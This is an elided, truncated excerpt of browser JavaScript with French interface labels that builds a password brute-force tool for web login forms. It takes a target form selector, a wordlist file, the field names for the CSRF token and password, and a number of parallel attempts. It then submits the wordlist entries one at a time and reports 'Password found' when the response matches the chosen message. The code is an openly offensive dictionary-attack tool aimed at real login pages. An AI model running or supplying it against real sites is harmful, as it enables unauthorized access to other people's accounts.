...
//  }
  ...
  form.appendChild(bruteCreateInputRow('Sélecteur du formulaire', 'text', 'form_selector'));
  form.appendChild(bruteCreateInputRow('Liste de mots', 'file', 'word_list'));
  form.appendChild(bruteCreateInputRow('Message attendu', 'text', 'displayed_message'));
  form.appendChild(bruteCreateInputRow('Le message s\'affiche en cas de succès', 'checkbox', 'on_success'))
  form.appendChild(bruteCreateInputRow('Nom de la propriété token CSRF', 'text', 'csrf_token_key'));
  form.appendChild(bruteCreateInputRow('Nom de la propriété password', 'text', 'password_key'));
  form.appendChild(bruteCreateInputRow('Nombre de tentatives à la fois', 'number', 'speed', 1));
  form.appendChild(bruteCreateInputRow('Démarrer', 'submit', 'start', 'Commencer l\'attaque'));
  ...
  form.addEventListener('submit', function (e) {
    ...
    var loginForm = document.querySelector(document.getElementById('form_selector').value);
    ...
    fr.onload = function () {
      ...
      var repeatedRequest = function () {
        msg.textContent = 'Looking for ' + passwordIndex + ' over ' + wordlist.length;
        var passwordTested = wordlist[passwordIndex++];
        data[passwordKey] = passwordTested;
        var callback = function (rep) {
          if (!stopped) {
            var condition = onsuccess ? rep.match(displayedMessage) : ! rep.match(displayedMessage);
            if (condition) {
              msg.textContent = 'Password found : ' + passwordTested;
              stopped = true;
            } else {
              var div = document.createElement('div');
              div.innerHTML = rep.replace(/^[\s\S]*<body.*?>|<\/body>[\s\S]*$/ig, '');
